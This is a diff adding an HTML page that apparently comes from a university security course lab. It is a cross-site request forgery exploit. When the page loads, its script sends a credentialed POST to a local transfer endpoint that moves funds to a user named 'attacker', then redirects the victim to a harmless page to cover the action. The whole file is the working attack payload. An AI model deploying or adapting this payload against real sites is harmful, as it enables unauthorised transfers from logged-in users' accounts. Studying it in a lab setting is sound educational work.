@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<script>
+		// Tranfer to 'attacker'
+		const params = "destination_username=attacker&quantity=10";
+		const req = new XMLHttpRequest();
+		req.withCredentials=true;
+		req.onload = function() {
+			// Reload to a nice, safe page as soon as we're done!
+			window.location = 'http://crypto.stanford.edu/cs155/';
+		}
+		req.open('POST', 'http://localhost:3000/post_transfer');
+		req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+		req.send(params);
+		</script>
+	</head>
+	<body></body>
+</html>
